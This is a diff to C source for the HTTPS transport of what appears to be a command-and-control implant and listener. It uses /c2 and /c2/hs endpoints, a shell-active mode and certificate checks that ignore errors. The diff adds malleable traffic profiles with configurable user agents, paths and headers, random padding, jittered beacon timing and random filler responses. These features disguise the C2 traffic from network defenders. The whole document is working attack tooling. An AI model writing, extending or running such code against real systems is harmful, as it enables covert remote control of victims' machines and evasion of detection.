@@ -20,6 +20,9 @@
 #include "transport.h"
 #include "crypto_dragon.h"
 #include "client_config.h"
+#include "padding.h"
+
+#include "malleable_profile.h"
  
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -40,10 +43,32 @@
 #define HTTPS_MAX_RECV_RETRIES         300
 #define HTTPS_RETRY_INTERVAL_MS        200
  
-#define HTTPS_USER_AGENT    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-#define HTTPS_CONTENT_TYPE  L"Content-Type: application/octet-stream\r\nConnection: keep-alive\r\n"
-#define HTTPS_PATH_DATA     L"/c2"
-#define HTTPS_PATH_HS       L"/c2/hs"
+static wchar_t g_https_user_agent[256]  = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+static wchar_t g_https_content_type[512] = L"Content-Type: application/octet-stream\r\nConnection: keep-alive\r\n";
+static wchar_t g_https_path_data[64]    = L"/c2";
+static wchar_t g_https_path_hs[64]      = L"/c2/hs";
+static char g_https_path_data_a[64] = "/c2";
+static char g_https_path_hs_a[64]   = "/c2/hs";
+static uint16_t g_https_pad_min = 0;
+static uint16_t g_https_pad_max = 0;
+
+void https_set_padding(uint16_t pad_min, uint16_t pad_max)
+{
+    g_https_pad_min = pad_min;
+    g_https_pad_max = pad_max;
+}
+
+#define HTTPS_USER_AGENT   g_https_user_agent
+#define HTTPS_CONTENT_TYPE g_https_content_type
+#define HTTPS_PATH_DATA    g_https_path_data
+#define HTTPS_PATH_HS      g_https_path_hs
+
+static void jittered_sleep(DWORD base_ms)
+{
+    DWORD half = base_ms / 2;
+    DWORD sleep_ms = half + (DWORD)randombytes_uniform(base_ms + 1);
+    Sleep(sleep_ms);
+}
  
 /* ==========================================================================
  * Connection mod
@@ -54,7 +79,7 @@
 /* ==========================================================================
  * Frame queue (MODE_SERVER)
  * ======================================================================= */
-typedef struct { uint8_t data[FRAME_SIZE]; } SrvFrameSlot;
+typedef struct { uint8_t data[WIRE_FRAME_SIZE]; } SrvFrameSlot;
  
 typedef struct {
     SrvFrameSlot     slots[32];
@@ -78,7 +103,7 @@ static void sfq_destroy(SrvFrameQueue *q) {
 static int sfq_push(SrvFrameQueue *q, const uint8_t *frame) {
     if (WaitForSingleObject(q->not_full, 10000) == WAIT_TIMEOUT) return -1;
     EnterCriticalSection(&q->mu);
-    memcpy(q->slots[q->tail].data, frame, FRAME_SIZE);
+    memcpy(q->slots[q->tail].data, frame, WIRE_FRAME_SIZE);
     q->tail = (q->tail + 1) % 32;
     q->count++;
     if (q->count < 32) SetEvent(q->not_full);
@@ -90,7 +115,7 @@ static int sfq_pop(SrvFrameQueue *q, uint8_t *frame, DWORD timeout_ms) {
     if (WaitForSingleObject(q->not_empty, timeout_ms) == WAIT_TIMEOUT) return -1;
     EnterCriticalSection(&q->mu);
     if (q->count == 0) { LeaveCriticalSection(&q->mu); return -1; }
-    memcpy(frame, q->slots[q->head].data, FRAME_SIZE);
+    memcpy(frame, q->slots[q->head].data, WIRE_FRAME_SIZE);
     q->head = (q->head + 1) % 32;
     q->count--;
     SetEvent(q->not_full);
@@ -119,6 +144,7 @@ struct transport_conn {
     volatile int     pin_verified;
     uint8_t          hs_server_pub[32];
     volatile int     hs_pub_ready;
+    SrvFrameQueue    pb_q;
  
     /* MODE_SERVER: OpenSSL */
     SOCKET           fd;
@@ -272,7 +298,7 @@ static int ssl_write_exact(SSL *ssl, const void *buf, size_t n) {
 typedef struct {
     char    method[8];
     char    path[64];
-    uint8_t body[FRAME_SIZE + 64];
+    uint8_t body[WIRE_FRAME_SIZE + 1024];
     int     body_len;
 } SrvHttpRequest;
  
@@ -353,6 +379,8 @@ typedef struct {
     HANDLE            new_conn_event;
     HANDLE            dispatcher_thread;
     volatile int      running;
+    malleable_profile_t profile;
+    int profile_loaded;
 } SrvListenerState;
  
 #define MAX_SRV_LISTENERS 8
@@ -428,7 +456,7 @@ static DWORD WINAPI srv_worker_thread(LPVOID arg)
  
         /* -- POST /c2/hs - handshake or reconnection -- */
         if (strcmp(req.method, "POST") == 0 &&
-            strcmp(req.path,   "/c2/hs") == 0 &&
+            strcmp(req.path, ls->profile.http_path_hs) == 0 &&
             req.body_len == 32)
         {
             EnterCriticalSection(&ls->mu);
@@ -472,7 +500,7 @@ static DWORD WINAPI srv_worker_thread(LPVOID arg)
                 LeaveCriticalSection(&conn->srv_tx_q.mu);
             }
  
-            uint8_t padded[FRAME_SIZE] = {0};
+            uint8_t padded[WIRE_FRAME_SIZE] = {0};
             memcpy(padded, req.body, 32);
             sfq_push(&conn->srv_rx_q, padded);
  
@@ -498,20 +526,41 @@ static DWORD WINAPI srv_worker_thread(LPVOID arg)
         }
  
         if (strcmp(req.method, "POST") == 0 &&
-            strcmp(req.path,   "/c2")   == 0 &&
-            req.body_len == FRAME_SIZE)
+            strcmp(req.path, ls->profile.http_path_data) == 0 &&
+            req.body_len >= WIRE_FRAME_SIZE)
         {
             sfq_push(&conn->srv_rx_q, req.body);
-            srv_respond(ssl, 204, NULL, 0);
+            uint8_t frame[WIRE_FRAME_SIZE];
+            if (sfq_pop(&conn->srv_tx_q, frame, 0) == 0) {
+                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
+                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
+                int pad_len = generate_padding(ls->profile.pkt_pad_min,
+                                               ls->profile.pkt_pad_max,
+                                               sendbuf + WIRE_FRAME_SIZE, 1024);
+                srv_respond(ssl, 200, sendbuf, WIRE_FRAME_SIZE + pad_len);
+            } else {
+                uint8_t filler[64];
+                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
+                randombytes_buf(filler, flen);
+                srv_respond(ssl, 200, filler, (int)flen);
+            }
         }
-        else if (strcmp(req.method, "GET") == 0 &&
-                 strcmp(req.path,   "/c2") == 0)
+        else if (strcmp(req.method, "GET") == 0 && strcmp(req.path, ls->profile.http_path_data) == 0)
         {
-            uint8_t frame[FRAME_SIZE];
-            if (sfq_pop(&conn->srv_tx_q, frame, 20000) == 0)
-                srv_respond(ssl, 200, frame, FRAME_SIZE);
-            else
-                srv_respond(ssl, 204, NULL, 0);
+            uint8_t frame[WIRE_FRAME_SIZE];
+            if (sfq_pop(&conn->srv_tx_q, frame, 20000) == 0) {
+                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
+                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
+                int pad_len = generate_padding(ls->profile.pkt_pad_min,
+                                               ls->profile.pkt_pad_max,
+                                               sendbuf + WIRE_FRAME_SIZE, 1024);
+                srv_respond(ssl, 200, sendbuf, WIRE_FRAME_SIZE + pad_len);
+            } else {
+                uint8_t filler[64];
+                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
+                randombytes_buf(filler, flen);
+                srv_respond(ssl, 200, filler, (int)flen);
+            }
         }
         else {
             srv_respond(ssl, 404, NULL, 0);
@@ -606,8 +655,11 @@ static int https_listen(int port)
  
     SrvListenerState *ls = calloc(1, sizeof *ls);
     if (!ls) { closesocket(s); return -1; }
-    ls->listen_sock    = s;
-    ls->running        = 1;
+    ls->listen_sock = s;
+    ls->running = 1;
+    memset(&ls->profile, 0, sizeof(ls->profile));
+    strncpy(ls->profile.http_path_hs, g_https_path_hs_a, sizeof(ls->profile.http_path_hs) - 1);
+    strncpy(ls->profile.http_path_data, g_https_path_data_a, sizeof(ls->profile.http_path_data) - 1);
     InitializeCriticalSection(&ls->mu);
     ls->new_conn_event = CreateEvent(NULL, FALSE, FALSE, NULL);
  
@@ -664,6 +716,7 @@ static transport_conn_t *https_connect(const char *host, int port)
         !conn->h_connect_recv ||
         !conn->h_connect_hs) goto fail;
  
+    sfq_init(&conn->pb_q);
     printf("[HTTPS] connected to %s:%d\n", host, port);
     return conn;
  
@@ -708,8 +761,8 @@ static int https_send(transport_conn_t *conn,
             SetEvent(conn->srv_hs_event);
             return 32;
         }
-        if (len != FRAME_SIZE) return -1;
-        return sfq_push(&conn->srv_tx_q, buf) == 0 ? (int)FRAME_SIZE : -1;
+        if (len != WIRE_FRAME_SIZE) return -1;
+        return sfq_push(&conn->srv_tx_q, buf) == 0 ? (int)WIRE_FRAME_SIZE : -1;
     }
  
     /* MODE_CLIENT via WinHTTP */
@@ -739,12 +792,28 @@ static int https_send(transport_conn_t *conn,
                        HTTPS_TIMEOUT_SEND_MS,
                        recv_to);
  
-    BOOL ok = WinHttpSendRequest(h_req,
-                                  HTTPS_CONTENT_TYPE, (DWORD)-1L,
-                                  (LPVOID)buf, (DWORD)len,
-                                  (DWORD)len, 0);
+    LPVOID send_buf = (LPVOID)buf;
+    DWORD  send_len = (DWORD)len;
+    uint8_t *padded = NULL;
+
+    if (!conn->is_hs_mode && len == WIRE_FRAME_SIZE && g_https_pad_max > 0) {
+        uint8_t pad[1024];
+        int pad_len = generate_padding(g_https_pad_min, g_https_pad_max, pad, 1024);
+        if (pad_len > 0) {
+            padded = malloc(WIRE_FRAME_SIZE + pad_len);
+            if (padded) {
+                memcpy(padded, buf, WIRE_FRAME_SIZE);
+                memcpy(padded + WIRE_FRAME_SIZE, pad, pad_len);
+                send_buf = padded;
+                send_len = WIRE_FRAME_SIZE + pad_len;
+            }
+        }
+    }
+
+    BOOL ok = WinHttpSendRequest(h_req, HTTPS_CONTENT_TYPE, (DWORD)-1L, send_buf, send_len, send_len, 0);
     if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
         WinHttpCloseHandle(h_req);
+        if (padded) free(padded);
         LeaveCriticalSection(&conn->send_lock);
         return -1;
     }
@@ -767,8 +836,24 @@ static int https_send(transport_conn_t *conn,
             }
         }
     }
+
+    if (!conn->is_hs_mode && status == 200) {
+        uint8_t resp[WIRE_FRAME_SIZE + 1024];
+        size_t total = 0;
+        DWORD avail = 0;
+        while (WinHttpQueryDataAvailable(h_req, &avail) && avail > 0) {
+            DWORD to_read = (total + avail <= sizeof(resp)) ? avail : (DWORD)(sizeof(resp) - total);
+            if (to_read == 0) break;
+            DWORD rd = 0;
+            if (!WinHttpReadData(h_req, resp + total, to_read, &rd)) break;
+            total += rd;
+        }
+        if (total >= WIRE_FRAME_SIZE)
+            sfq_push(&conn->pb_q, resp);
+    }
  
     WinHttpCloseHandle(h_req);
+    if (padded) free(padded);
     LeaveCriticalSection(&conn->send_lock);
     return (status == 200 || status == 204) ? (int)len : -1;
 }
@@ -779,9 +864,9 @@ static int https_recv(transport_conn_t *conn,
     if (!conn || !buf || len == 0) return -1;
  
     if (conn->mode == CONN_MODE_SERVER) {
-        uint8_t frame[FRAME_SIZE];
+        uint8_t frame[WIRE_FRAME_SIZE];
         if (sfq_pop(&conn->srv_rx_q, frame, INFINITE) != 0) return -1;
-        size_t copy = (len < FRAME_SIZE) ? len : FRAME_SIZE;
+        size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
         memcpy(buf, frame, copy);
         return (int)copy;
     }
@@ -805,85 +890,79 @@ static int https_recv(transport_conn_t *conn,
         return -1;
     }
  
-    /* MODE_CLIENT: GET /c2 long-poll */
-    for (int attempt = 0; attempt < HTTPS_MAX_RECV_RETRIES; attempt++) {
-        EnterCriticalSection(&conn->recv_lock);
- 
-        DWORD recv_to = conn->shell_active
-                      ? HTTPS_TIMEOUT_RECV_SHELL_MS
-                      : HTTPS_TIMEOUT_RECV_LONG_MS;
- 
-        HINTERNET h_req = WinHttpOpenRequest(
-            conn->h_connect_recv, L"GET", HTTPS_PATH_DATA, NULL,
-            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-            WINHTTP_FLAG_SECURE);
-        if (!h_req) {
-            LeaveCriticalSection(&conn->recv_lock);
-            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
+        /* --- Piggyback: check queue (non-blocking) --- */
+    {
+        uint8_t pb_frame[WIRE_FRAME_SIZE];
+        if (sfq_pop(&conn->pb_q, pb_frame, 0) == 0) {
+            size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
+            memcpy(buf, pb_frame, copy);
+            return (int)copy;
         }
- 
+    }
+
+    for (int attempt = 0; attempt < HTTPS_MAX_RECV_RETRIES; attempt++) {
+        {
+            uint8_t pb_frame[WIRE_FRAME_SIZE];
+            if (sfq_pop(&conn->pb_q, pb_frame, 0) == 0) {
+                size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
+                memcpy(buf, pb_frame, copy);
+                return (int)copy;
+            }
+        }
+
+        EnterCriticalSection(&conn->recv_lock);
+        DWORD recv_to = conn->shell_active ? HTTPS_TIMEOUT_RECV_SHELL_MS : HTTPS_TIMEOUT_RECV_LONG_MS;
+
+        HINTERNET h_req = WinHttpOpenRequest(conn->h_connect_recv, L"GET", HTTPS_PATH_DATA,
+            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!h_req) { LeaveCriticalSection(&conn->recv_lock); jittered_sleep(HTTPS_RETRY_INTERVAL_MS); continue; }
+
         DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
         WinHttpSetOption(h_req, WINHTTP_OPTION_SECURITY_FLAGS,
                          &sec_flags, sizeof sec_flags);
-        WinHttpSetTimeouts(h_req,
-                           HTTPS_TIMEOUT_CONNECT_MS,
-                           HTTPS_TIMEOUT_CONNECT_MS,
-                           HTTPS_TIMEOUT_SEND_MS,
-                           recv_to);
- 
-        BOOL ok = WinHttpSendRequest(h_req,
-                                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        WinHttpSetTimeouts(h_req, HTTPS_TIMEOUT_CONNECT_MS, HTTPS_TIMEOUT_CONNECT_MS,
+                           HTTPS_TIMEOUT_SEND_MS, recv_to);
+
+        BOOL ok = WinHttpSendRequest(h_req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
         if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
-            WinHttpCloseHandle(h_req);
-            LeaveCriticalSection(&conn->recv_lock);
-            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
+            DWORD err = GetLastError();
+            WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock);
+            if (err == ERROR_WINHTTP_TIMEOUT) continue;
+            jittered_sleep(HTTPS_RETRY_INTERVAL_MS); continue;
         }
- 
-        if (!conn->pin_verified) {
-            if (LEVEL_CLIENT == 1) {
-                if (https_verify_pin(h_req) != 0) {
-                    WinHttpCloseHandle(h_req);
-                    LeaveCriticalSection(&conn->recv_lock);
-                    return -1;
-                }
+
+        if (!conn->pin_verified && conn->h_connect_recv && LEVEL_CLIENT == 1) {
+            if (https_verify_pin(h_req) != 0) {
+                printf("[HTTPS] certificate pin mismatch on recv!\n");
+                WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock);
+                return -1;
             }
             conn->pin_verified = 1;
         }
- 
+
         DWORD status = 0, sz = sizeof(DWORD);
-        WinHttpQueryHeaders(h_req,
-                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                            WINHTTP_HEADER_NAME_BY_INDEX,
-                            &status, &sz, WINHTTP_NO_HEADER_INDEX);
- 
-        if (status == 204) {
-            WinHttpCloseHandle(h_req);
-            LeaveCriticalSection(&conn->recv_lock);
-            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
-        }
+        WinHttpQueryHeaders(h_req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
+
         if (status != 200) {
-            WinHttpCloseHandle(h_req);
-            LeaveCriticalSection(&conn->recv_lock);
+            WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock);
+            if (status == 204) { jittered_sleep(HTTPS_RETRY_INTERVAL_MS); continue; }
             return -1;
         }
- 
+
         size_t total = 0, cap = FRAME_SIZE * 2;
         uint8_t *resp = malloc(cap);
-        if (!resp) {
-            WinHttpCloseHandle(h_req);
-            LeaveCriticalSection(&conn->recv_lock);
-            return -1;
-        }
- 
+        if (!resp) { WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock); return -1; }
+
         DWORD avail = 0;
         while (WinHttpQueryDataAvailable(h_req, &avail) && avail > 0) {
             if (total + avail > cap) {
                 cap = total + avail + FRAME_SIZE;
                 uint8_t *tmp = realloc(resp, cap);
-                if (!tmp) { free(resp); goto err; }
+                if (!tmp) { free(resp); WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock); return -1; }
                 resp = tmp;
             }
             DWORD rd = 0;
@@ -892,16 +971,11 @@ static int https_recv(transport_conn_t *conn,
         }
         WinHttpCloseHandle(h_req);
         LeaveCriticalSection(&conn->recv_lock);
- 
-        if (total < len) { free(resp); return -1; }
+
+        if (total < len) { free(resp); jittered_sleep(HTTPS_RETRY_INTERVAL_MS); continue; }
         memcpy(buf, resp, len);
         free(resp);
         return (int)len;
- 
-    err:
-        WinHttpCloseHandle(h_req);
-        LeaveCriticalSection(&conn->recv_lock);
-        return -1;
     }
     return -1;
 }
@@ -932,6 +1006,7 @@ static void https_close(transport_conn_t *conn)
     conn->running = 0;
  
     if (conn->mode == CONN_MODE_CLIENT) {
+        sfq_destroy(&conn->pb_q);
         if (conn->h_connect_send) WinHttpCloseHandle(conn->h_connect_send);
         if (conn->h_connect_recv) WinHttpCloseHandle(conn->h_connect_recv);
         if (conn->h_connect_hs)   WinHttpCloseHandle(conn->h_connect_hs);
@@ -984,6 +1059,51 @@ void https_set_shell_active(transport_conn_t *conn, int active)
 {
     if (conn && conn->mode == CONN_MODE_CLIENT)
         conn->shell_active = active;
+}
+
+void https_apply_profile(const char *user_agent, const char *content_type,
+                         const char *path_data, const char *path_hs,
+                         const char *extra_headers)
+{
+    if (user_agent && user_agent[0])
+        MultiByteToWideChar(CP_ACP, 0, user_agent, -1, g_https_user_agent, 256);
+    if (path_data && path_data[0]) {
+        MultiByteToWideChar(CP_ACP, 0, path_data, -1, g_https_path_data, 64);
+        strncpy(g_https_path_data_a, path_data, sizeof(g_https_path_data_a) - 1);
+        g_https_path_data_a[sizeof(g_https_path_data_a) - 1] = '\0';
+    }
+    if (path_hs && path_hs[0]) {
+        MultiByteToWideChar(CP_ACP, 0, path_hs, -1, g_https_path_hs, 64);
+        strncpy(g_https_path_hs_a, path_hs, sizeof(g_https_path_hs_a) - 1);
+        g_https_path_hs_a[sizeof(g_https_path_hs_a) - 1] = '\0';
+    }
+    if (content_type && content_type[0]) {
+        wchar_t ct[256]; ct[0] = L'\0';
+        swprintf(ct, 256, L"Content-Type: ");
+        wchar_t wct[128];
+        MultiByteToWideChar(CP_ACP, 0, content_type, -1, wct, 128);
+        wcscat(ct, wct);
+        wcscat(ct, L"\r\nConnection: keep-alive\r\n");
+        if (extra_headers && extra_headers[0]) {
+            wchar_t weh[256];
+            MultiByteToWideChar(CP_ACP, 0, extra_headers, -1, weh, 256);
+            wcscat(ct, weh);
+            if (ct[wcslen(ct)-1] != L'\n') wcscat(ct, L"\r\n");
+        }
+        wcscpy(g_https_content_type, ct);
+    }
+    printf("[HTTPS] Profile applied: path_data=%ls path_hs=%ls\n",
+           g_https_path_data, g_https_path_hs);
+}
+
+void https_server_set_listener_profile(int listen_fd, const malleable_profile_t *prof)
+{
+    SOCKET s = (SOCKET)(INT_PTR)listen_fd;
+    SrvListenerState *ls = find_srv_listener(s);
+    if (!ls || !prof) return;
+    memcpy(&ls->profile, prof, sizeof(ls->profile));
+    ls->profile_loaded = 1;
+    printf("[HTTPS-SRV] Listener profile set: hs=%s data=%s\n", ls->profile.http_path_hs, ls->profile.http_path_data);
 }
  
 /* ==========================================================================
